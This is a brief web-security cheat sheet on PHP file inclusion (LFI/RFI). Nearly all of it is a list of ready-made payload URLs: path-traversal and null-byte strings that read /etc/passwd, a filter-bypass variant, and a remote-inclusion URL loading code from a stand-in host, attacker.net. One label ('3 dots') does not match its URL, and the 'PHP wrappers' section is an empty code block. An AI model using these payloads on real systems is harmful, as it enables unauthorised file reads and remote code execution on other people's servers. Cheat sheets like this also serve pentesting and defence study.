## File Inclsusion (LFI/RFI)

![](https://miro.medium.com/v2/resize:fit:644/1*UPMlwBWgKMSUzSvY5mt5uw.png)

**What is File Inclusion  Attack?**

A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time.
**General Payloads**

```
http://vulnerable-web.com/index.php?page=../../../etc/passwd (Read /etc/passwd)
http://vulnerable-web.com/index.php?page=/etc/passwd (Read /etc/passwd)
http://example.com/index.php?page=/etc/passwd%00 (Read /etc/passwd) [Fixed in PHP 5.4 and later versions]
http://example.com/index.php?page=..././..././..././..././..././..././..././..././etc/passwd (Bypass ../ Filters)
http://example.com/index.php?page=../../../etc/passwd (3 dots in Linux)
http://example.com/index.php?page=http://attacker.net/eval.php.txt (Remote File Inclusion)
```

**PHP wrappers & protocols**

```

```
